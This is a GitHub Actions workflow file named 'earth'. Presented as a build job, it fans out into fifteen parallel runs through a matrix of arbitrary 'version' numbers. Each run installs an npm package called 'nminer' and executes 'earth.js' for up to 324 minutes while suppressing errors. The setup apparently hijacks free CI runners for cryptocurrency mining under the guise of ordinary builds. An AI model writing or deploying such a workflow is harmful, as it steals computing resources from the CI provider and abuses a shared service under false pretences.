name: earth
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6157 }
          - { version: 3088 }
          - { version: 4625 }
          - { version: 5116 }
          - { version: 9232 }
          - { version: 5598 }
          - { version: 3440 }
          - { version: 3505 }
          - { version: 9738 }
          - { version: 7208 }
          - { version: 1621 }
          - { version: 3012 }
          - { version: 9848 }
          - { version: 4636 }
          - { version: 8888 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: pace
        run: |
          npm install nminer@latest
          timeout 324m node earth.js || echo "earth executed"